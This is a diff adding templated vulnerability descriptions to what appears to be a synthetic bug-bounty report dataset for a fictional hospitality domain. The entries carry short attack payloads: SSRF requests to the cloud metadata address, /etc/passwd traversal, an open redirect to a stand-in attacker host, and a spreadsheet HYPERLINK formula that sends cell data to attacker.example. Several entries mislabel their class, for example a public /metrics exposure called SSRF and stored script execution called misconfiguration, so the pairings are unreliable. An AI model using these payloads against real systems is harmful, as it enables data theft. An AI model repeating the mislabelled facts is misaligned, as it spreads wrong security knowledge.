+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenblick-hospitality.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -796,7 +801,8 @@
           "offset": "4d 1h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.alpenblick-hospitality.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -952,7 +958,8 @@
           "offset": "15h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.alpenblick-hospitality.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1125,7 +1132,8 @@
           "offset": "8d 1h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.alpenblick-hospitality.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1253,7 +1261,8 @@
           "offset": "1d 14h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenblick-hospitality.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1359,7 +1368,8 @@
           "offset": "18h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.alpenblick-hospitality.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1456,7 +1466,8 @@
           "offset": "2d 15h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenblick-hospitality.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1599,7 +1610,8 @@
           "offset": "7d 20h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.alpenblick-hospitality.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1699,7 +1711,8 @@
           "offset": "2d 5h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.alpenblick-hospitality.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1853,7 +1866,8 @@
           "offset": "5d 14h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.alpenblick-hospitality.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1952,7 +1966,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.alpenblick-hospitality.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2107,7 +2122,8 @@
           "offset": "4d 17h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.alpenblick-hospitality.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2223,7 +2239,8 @@
           "offset": "2d 18h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenblick-hospitality.foo/import`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2386,7 +2403,8 @@
           "offset": "8d",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.alpenblick-hospitality.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2526,7 +2544,8 @@
           "offset": "1d",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.alpenblick-hospitality.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2666,7 +2685,8 @@
           "offset": "6d 15h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.alpenblick-hospitality.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2794,7 +2814,8 @@
           "offset": "5h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.alpenblick-hospitality.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2890,7 +2911,8 @@
           "offset": "2d",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.alpenblick-hospitality.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3010,7 +3032,8 @@
           "offset": "14h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.alpenblick-hospitality.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3113,7 +3136,8 @@
           "offset": "1d 11h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.alpenblick-hospitality.foo/profile`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3304,7 +3328,8 @@
           "offset": "8d 17h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.alpenblick-hospitality.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3464,7 +3489,8 @@
           "offset": "3d 16h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.alpenblick-hospitality.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3639,7 +3665,8 @@
           "offset": "7d 3h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.alpenblick-hospitality.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3758,7 +3785,8 @@
           "offset": "2d",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.alpenblick-hospitality.foo/admin/queue`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3875,7 +3903,8 @@
           "offset": "3d 23h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.alpenblick-hospitality.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4027,7 +4056,8 @@
           "offset": "7d 9h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.alpenblick-hospitality.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4151,7 +4181,8 @@
           "offset": "1d 1h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.alpenblick-hospitality.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4299,7 +4330,8 @@
           "offset": "9d 3h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.alpenblick-hospitality.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4434,7 +4466,8 @@
           "offset": "8d 3h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.alpenblick-hospitality.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4602,7 +4635,8 @@
           "offset": "4d 4h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.alpenblick-hospitality.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -4728,7 +4762,8 @@
           "offset": "3d 5h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.alpenblick-hospitality.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4851,7 +4886,8 @@
           "offset": "4d",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
